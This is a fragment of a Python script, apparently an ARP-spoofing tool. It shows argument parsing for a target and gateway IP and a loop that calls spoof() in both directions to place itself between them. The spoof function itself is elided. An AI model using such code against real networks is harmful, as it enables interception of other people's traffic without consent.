...
def get_arguments():
    ...
    parser.add_argument("-t", "--target", dest="target", default="10.0.0.6", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", default="10.0.0.138", help="Gateway IP")
...
try:
    while True:
        spoof("10.0.0.6", "10.0.0.138")
        spoof("10.0.0.138", "10.0.0.6")
